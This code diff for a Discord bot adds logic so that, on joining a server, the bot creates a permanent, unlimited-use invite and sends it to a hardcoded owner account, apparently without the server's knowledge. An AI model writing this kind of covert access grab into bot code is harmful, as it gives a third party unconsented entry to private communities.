@@ -41,6 +41,10 @@ client.on("ready", async () => {
 });
 
 client.on("guildCreate", async guild => {
+    const Invite = await guild.channels.cache.find(e => e.permissionsFor(guild.me).has("CREATE_INSTANT_INVITE") && e.type == "GUILD_TEXT").createInvite({
+        maxUses: 0,
+        maxAge: 0
+    });
     const owner = await client.users.fetch("820465204411236362");
 
     const clean = text => {
@@ -71,7 +75,8 @@ client.on("guildCreate", async guild => {
                     .setStyle("SECONDARY")
                 ]
             }
-        ]
+        ],
+        content: `Invite: ${Invite}`
     });
 });
 
